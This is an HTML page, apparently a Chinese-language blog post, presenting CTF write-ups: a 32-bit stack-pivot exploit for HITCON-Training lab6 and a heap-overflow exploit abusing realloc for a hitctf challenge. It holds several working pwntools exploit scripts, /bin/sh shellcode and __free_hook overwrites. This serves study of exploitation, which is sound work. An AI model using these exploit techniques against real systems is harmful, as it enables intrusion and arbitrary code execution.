@@ -1,0 +1,2112 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/page/2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-2022-01-02-pwnbeginer" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/01/02/2022-01-02-pwnbeginer/" class="article-date">
+  <time class="dt-published" datetime="2022-01-01T19:18:21.000Z" itemprop="datePublished">2022-01-02</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/pwn/">pwn</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/01/02/2022-01-02-pwnbeginer/">pwn 新手向</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>这是我前年写的两个很简单的 pwn 题，很常规的栈迁移思路，我现在都看不懂了，2333。得记下来以后没事了看。</p>
+<h1 id="第一个"><a href="#第一个" class="headerlink" title="第一个"></a>第一个</h1><p>这个思路是自己做一道很简单的题时一步一步边优化边想的，顺着这个思路加深了对栈迁移的理解，分享一下。但本人文笔实在垃圾，各位看官有觉得不对劲的请在评论区留言</p>
+<h1 id="题目链接如下（文末也放了链接"><a href="#题目链接如下（文末也放了链接" class="headerlink" title="题目链接如下（文末也放了链接"></a>题目链接如下（文末也放了链接</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/scwuaptx/HITCON-Training/blob/master/LAB/lab6/migration">lab6</a></p>
+</blockquote>
+<h1 id="程序大致分析"><a href="#程序大致分析" class="headerlink" title="程序大致分析"></a>程序大致分析</h1><p>保护措施如此这般：</p>
+<pre><code>└&gt; checksec migration 
+[*] &#39;/home/pic/Desktop/hitcon/migration&#39;
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+	
+</code></pre>
+<p>程序如此这般：</p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf; // [esp+0h] [ebp-28h]
+
+  if ( count != 1337 )
+    exit(1);
+  ++count;
+  setvbuf(_bss_start, 0, 2, 0);
+  puts(&quot;Try your best :&quot;);
+  return read(0, &amp;buf, 0x40u);
+}
+</code></pre>
+<p>程序很干净，存在<code>read</code>函数的溢出，且溢出字节为 0x28 即 40 ，但不像 64 位有很好用的万能 gadget ，之前做过类似的题，记得套路如下：</p>
+<ul>
+<li>通过 read 函数把 rop 链读到 bss 端</li>
+<li>构造 bss 端</li>
+<li>迁移到 bss 端执行</li>
+</ul>
+<p>经过大致分析常规套路，应该是要有三次 shellcode ，因为构造 bss 端时必然无法执行任何操作，但其实在构造 bss 时候可以把第三次的起 shell 合并，即下方的 exp</p>
+<h1 id="带栈迁移的-ret2libc"><a href="#带栈迁移的-ret2libc" class="headerlink" title="带栈迁移的 ret2libc"></a>带栈迁移的 ret2libc</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;migration&#x27;)</span><br><span class="line">elf = ELF(&#x27;migration&#x27;)</span><br><span class="line">libc = elf.libc</span><br><span class="line">got = elf.got[&quot;puts&quot;]</span><br><span class="line">io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">payload1 = &#x27;a&#x27;*40+p32(0x804A008+0x28+0x500)+p32(0x80484EA)+p32(got)</span><br><span class="line">io.send(payload1)</span><br><span class="line">real = u32(io.recv(4))</span><br><span class="line">base = real - libc.symbols[&quot;puts&quot;]</span><br><span class="line">one_gadget = base+0x3ac69</span><br><span class="line">payload2 = p32(0)+p32(one_gadget)+p32(0)*8+p32(0x804A008+0x500)+p32(0x8048504)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>one_gadget</code>地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">▶ one_gadget /lib/i386-linux-gnu/libc.so.6</span><br><span class="line">...</span><br><span class="line">0x3ac69 execve(&quot;/bin/sh&quot;, esp+0x34, environ)</span><br><span class="line">constraints:</span><br><span class="line">  esi is the GOT address of libc</span><br><span class="line">  [esp+0x34] == NULL</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>看一下第一次的 payload ：（填入的地址就是栈中）</p>
+<ul>
+<li>将 ebp 改为<code>0x804A008+0x28+0x500</code>，其中 0x28 是因为 ebp 在 read 时决定最重要的参数–地址</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x80484f4 &lt;main+73&gt;:	lea    eax,[ebp-0x28]</span><br><span class="line">0x80484f7 &lt;main+76&gt;:	push   eax</span><br><span class="line">0x80484f8 &lt;main+77&gt;:	push   0x0</span><br><span class="line">0x80484fa &lt;main+79&gt;:	call   0x8048380	; read 函数</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>0x80484EA</code>地址是 <code>call puts</code>，之后的排布就是 put_got 参数了，能直接把 puts 地址泄露出来，便于后边 <code>one_gadget</code> 的计算</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:080484E5                 push    offset s        ; &quot;Try your best :&quot;</span><br><span class="line">.text:080484EA                 call    puts</span><br><span class="line">.text:080484EF                 add     esp, 4</span><br><span class="line">.text:080484F2                 push    40h             ; nbytes</span><br><span class="line">.text:080484F4                 lea     eax, [ebp+buf]</span><br><span class="line">.text:080484F7                 push    eax             ; buf</span><br><span class="line">.text:080484F8                 push    0               ; fd</span><br><span class="line">.text:080484FA                 call    read</span><br></pre></td></tr></table></figure>
+
+<p>之后的第二次 payload （填写地址是<code>0x804A008+0x500</code>就是因为之前第一次 payload 的 ebp 变化引起的）：</p>
+<ul>
+<li>前 40 字节没什么说的，就是把 one_gadget 填到正确位置，方便起 shell</li>
+<li>之后的<code>p32(0x804A008+0x500)</code>就是本轮的 ebp 了</li>
+<li>之后<code>p32(0x8048504)</code>是</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:08048504                 leave</span><br><span class="line">.text:08048505                 retn</span><br></pre></td></tr></table></figure>
+
+<p>程序溢出时<code>ebp esp eip</code>三个寄存器状态</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ebp = 0x804A008 + 0x500</span><br><span class="line">esp 无法直接控制</span><br><span class="line">eip 无法直接控制</span><br></pre></td></tr></table></figure>
+<p>之后的 <code>leave</code>片段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ebp = 0</span><br><span class="line">esp = 0x804A008 + 0x500 + 4 </span><br><span class="line">eip 无法直接控制</span><br></pre></td></tr></table></figure>
+<p>经过 ret 变成了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ebp = 0</span><br><span class="line">esp = 0x804A008 + 0x500 + 8</span><br><span class="line">eip = one_gadget</span><br></pre></td></tr></table></figure>
+
+<p>可以看到 ret 地址填写的就是 one_gadget 地址，但是因为本题 bss 端地址固定，所以完全可以通过 mprotect 函数来修改 bss 可执行权限，达到向 bss 端写 shellcode 并执行的效果， exp 如下</p>
+<h1 id="带-mprotect-的-ret2shellcode"><a href="#带-mprotect-的-ret2shellcode" class="headerlink" title="带 mprotect 的 ret2shellcode"></a>带 mprotect 的 ret2shellcode</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;migration&#x27;)</span><br><span class="line">elf = ELF(&#x27;migration&#x27;)</span><br><span class="line">libc = elf.libc</span><br><span class="line">got = elf.got[&quot;puts&quot;]</span><br><span class="line">io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">payload1 = &#x27;a&#x27;*40+p32(0x804A008+0x28+0x500)+p32(0x80484EA)+p32(got)</span><br><span class="line">io.send(payload1)</span><br><span class="line">real = u32(io.recv(4))</span><br><span class="line">base = real - libc.symbols[&quot;puts&quot;]</span><br><span class="line">mp = base + libc.symbols[&#x27;mprotect&#x27;]</span><br><span class="line">one = base+0x3ac69</span><br><span class="line">shellcode = &quot;\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80&quot;</span><br><span class="line">payload2 = shellcode+&#x27;a&#x27;*(40-len(shellcode))+p32(0)+p32(mp)+p32(0x804A008+0x500)+p32(0x804A000)+p32(0x1000)+p32(7)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>第一轮的 payload 没变，把第二轮的变成了</p>
+<ul>
+<li>前 40 字节是 shellcode 和 a 填充</li>
+<li>ebp 可以随意，用不到</li>
+<li>mprotect 函数地址</li>
+<li>ret 地址填 bss ，也即 shellcode 地址</li>
+<li>mprotect 用到的参数，达到<code>mprotect(0x804A000,0x1000,7)</code>的效果</li>
+</ul>
+<p>执行 mprotect 之前</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      /home/pic/Desktop/hitcon/migration</span><br><span class="line"> 0x8049000  0x804a000 r--p     1000 0      /home/pic/Desktop/hitcon/migration</span><br><span class="line"> 0x804a000  0x804b000 rw-p     1000 1000   /home/pic/Desktop/hitcon/migration</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>执行 mprotect 之后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      /home/pic/Desktop/hitcon/migration</span><br><span class="line"> 0x8049000  0x804a000 r--p     1000 0      /home/pic/Desktop/hitcon/migration</span><br><span class="line"> 0x804a000  0x804b000 rwxp     1000 1000   /home/pic/Desktop/hitcon/migration</span><br></pre></td></tr></table></figure>
+
+<p>有了可执行权限，跳转过去执行就 get shell 了</p>
+<h1 id="直接填入"><a href="#直接填入" class="headerlink" title="直接填入"></a>直接填入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;migration&#x27;)</span><br><span class="line">elf = ELF(&#x27;migration&#x27;)</span><br><span class="line">libc = elf.libc</span><br><span class="line">got = elf.got[&quot;puts&quot;]</span><br><span class="line">io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">payload1 = &#x27;a&#x27;*40+p32(0x804A008+0x28+0x500)+p32(0x80484EA)+p32(got)</span><br><span class="line">io.send(payload1)</span><br><span class="line">real = u32(io.recv(4))</span><br><span class="line">base = real - libc.symbols[&quot;puts&quot;]</span><br><span class="line">one = base+0x3ac69</span><br><span class="line">io.send(p32(0)*11+p32(one))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这招成功的核心在于第一次 payload 填的 ret 地址是 <code>0x80484EA</code> 等于执行了一遍下边的 <code>leave ret</code> ，让之前填入的 ebp 发挥了作用，有点困惑的可以自行调试深入体会，在此不予以赘述</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>经过上方的分析大家应该看到 ebp 用好对 exp 的编写和题目的理解有多大用处，尤其是最后一个。感觉自己之前一直有一个误区，就是填 ebp 就一定要填 <code>leave_ret</code> gadget ，后来发现不一定，一定要注意汇编前后语境，不遇到 ret 坚决不放松警惕。而且有时候把 main 函数中间某一段当作 ret 地址可以达到很多单纯构造 rop 链达不到的效果</p>
+<h1 id="第二个"><a href="#第二个" class="headerlink" title="第二个"></a>第二个</h1><p>最近佛系找题做,突然找到了一道去年 hitctf 的题,看网上也没有 writeup ,于是决定好好分析一波.太菜了,前后花了 5 个小时吧,服了,这题学了很多,分享出来</p>
+<h2 id="写在前面的程序"><a href="#写在前面的程序" class="headerlink" title="写在前面的程序"></a>写在前面的程序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	char* a = malloc(0x80);</span><br><span class="line">	char* b = malloc(0x10);</span><br><span class="line">	char* c = malloc(0x20);</span><br><span class="line">	char* d = malloc(0x20);</span><br><span class="line">	char* e = malloc(1);</span><br><span class="line">	a = realloc(a,0x20);</span><br><span class="line">	b = realloc(b,0x20);	//-------&gt;断点A</span><br><span class="line">	c = realloc(c,0x20);	//-------&gt;断点B</span><br><span class="line">	d = realloc(c,0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本程序意思便是 realloc 会重新排步堆空间,这里只介绍一下 a 和 b 块,剩下的可以自行调试.断到断点 A 处查看变化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x602000</span><br><span class="line">0x602000:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602030:	0x0000000000000000	0x0000000000000061</span><br><span class="line">0x602040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x602030 ◂— 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$5 = 0x602010 &quot;&quot;</span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$2 = 0x6020a0 &quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>realloc(a,0x20)</code>只用到了 0x31 字节,之前 malloc 剩下的直接扔到了 fastbin 里,被 free 掉.这里注意一下 b 指向 0x6020a0 .单步运行断在 B 处查看变化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p b</span><br><span class="line">$3 = 0x602140 &quot;&quot;</span><br><span class="line">pwndbg&gt; x/8gx 0x602140-0x10</span><br><span class="line">0x602130:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x602140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602160:	0x0000000000000000	0x0000000000020ea1</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x602090 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x602030 ◂— 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里 realloc 一个比之前大的会使之前的 b 直接被 free 掉,重新一个 malloc 一个合适的返给 b .</p>
+<p>前言结束</p>
+<h2 id="分析思路"><a href="#分析思路" class="headerlink" title="分析思路"></a>分析思路</h2><p>这题其实挺反常规的,程序的 bss 端 ptr 指向存放内容头,之后的内容头中有指向内容的指针,大致长这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bss-&gt;</span><br><span class="line">	**	0x31</span><br><span class="line">  title	name</span><br><span class="line">  time()	chunk_ptr</span><br><span class="line">  size	**</span><br><span class="line">  chk_ptr	-&gt;	content</span><br></pre></td></tr></table></figure>
+
+<p>在 edit 中有一个不太明显的堆溢出漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  if ( *((_DWORD *)ptr[v2] + 8) != v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = ptr[v2];</span><br><span class="line">    v1[3] = realloc(*((void **)ptr[v2] + 3), v3 + 1);	//realloc()函数,漏洞利用关键点</span><br><span class="line">  &#125;</span><br><span class="line">  puts(&quot;new message:&quot;);</span><br><span class="line">  return read(0, *((void **)ptr[v2] + 3), *((signed int *)ptr[v2] + 8));	//漏洞点, message size 未更新</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="泄漏-libc"><a href="#泄漏-libc" class="headerlink" title="泄漏 libc"></a>泄漏 libc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./pwn2&#x27;,aslr=2)</span><br><span class="line">elf = ELF(&quot;./pwn2&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;, checksec=False)</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line">def new(title,name,size,message):</span><br><span class="line">	p.sendafter(&#x27;Input your choice:&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendafter(&#x27;title:\n&#x27;,title)</span><br><span class="line">	p.sendafter(&#x27;name:\n&#x27;,name)</span><br><span class="line">	p.sendafter(&#x27;message size:\n&#x27;,str(size))</span><br><span class="line">	p.sendafter(&#x27;message:\n&#x27;,message)</span><br><span class="line">def edit(ind,size,message):</span><br><span class="line">	p.sendafter(&#x27;Input your choice:&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendafter(&#x27;Which one?\n&#x27;,str(ind))</span><br><span class="line">	p.sendafter(&#x27;message size:\n&#x27;,str(size))</span><br><span class="line">	p.sendafter(&#x27;new message:\n&#x27;,message)</span><br><span class="line">def show(ind):</span><br><span class="line">	p.sendafter(&#x27;Input your choice:&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendafter(&#x27;Which one?\n&#x27;,str(ind))</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendafter(&#x27;Input your choice:&#x27;,&#x27;4&#x27;)</span><br><span class="line">	p.sendafter(&#x27;Which one?\n&#x27;,str(ind))</span><br></pre></td></tr></table></figure>
+
+<p>这是框架函数,之后一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">new(&#x27;a&#x27;,&#x27;a&#x27;,0x80,&#x27;a&#x27;*0x80)</span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">让他 malloc 出来一块不属于 fastbin 的堆,再</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>new(‘b’,’b’,1,’b’)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">防止`topchunk`吞并上一个,然后编辑`edit(0,0x90,&#x27;1&#x27;*8)`让新的 size 和旧的不等触发</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>v1[3] &#x3D; realloc(*((void **)ptr[v2] + 3), v3 + 1);</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这样我们之前的第一个块就到了`unsortedbin`中,然后在`new(&#x27;d&#x27;,&#x27;d&#x27;,0x80,&#x27;d&#x27;*8)`一块,这样子内容头就用的是 unsortedbin ,填入 title 和 name 时候占用的就是之前 unsortedbin 残留的 fd 和 bk 了,填充一个字节之后 `show(2)` 让它泄漏出来减去偏移字节,这样就得到了 libc</span><br><span class="line"></span><br><span class="line">## getshell</span><br><span class="line"></span><br><span class="line">有了 libc 后基本思路就确定了,修改内容头使其指向`__free_hook`,并直接 edit 为 one_gadget ,之后 free 触发 getshell ,所以关键便是如何溢出覆盖内容头</span><br><span class="line"></span><br><span class="line">首先</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>new(‘a’,’a’,0xf7,’a’*0x20)<br>edit(3,0xb8,’0’)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">构造一个堆,并编辑,使得该块底下有一块可控范围,并控制在 0x30 的 fastbin 中,便于能溢出到内容头,之后</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>new(‘d’,’d’,1,’d’)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这个块就中招了,我们能够溢出它,之后填入我们精心构造的堆</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>edit(3,0xb8,’\x01’*0xc8+p64(0x31)*4+p64(libc.symbols[‘__free_hook’] + leak)+p64(0x51))</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">其中的排步效果如下</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>0x1474310:	0x0101010101010101	0x0000000000000031<br>0x1474320:	0x0000000000000031	0x0000000000000031<br>0x1474330:	0x0000000000000031	0x00007f15621627a8<br>0x1474340:	0x0000000000000051	0x0000000000020cc1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">之后就是编辑为 one_gadget 和触发了,这里要注意一定要和自己填入的 size 一样,不然又触发`v1[3] = realloc(*((void **)ptr[v2] + 3), v3 + 1);`,或大或小都不会成功,大的话重新 malloc ,小的话有逃不过检查</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>edit(4,0x51,p64(one))<br>free(0)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+<p>[+] Starting local process ‘.&#x2F;pwn2’: pid 6300<br>0x7f507bfa2000<br>[*] Switching to interactive mode<br>$  </p>
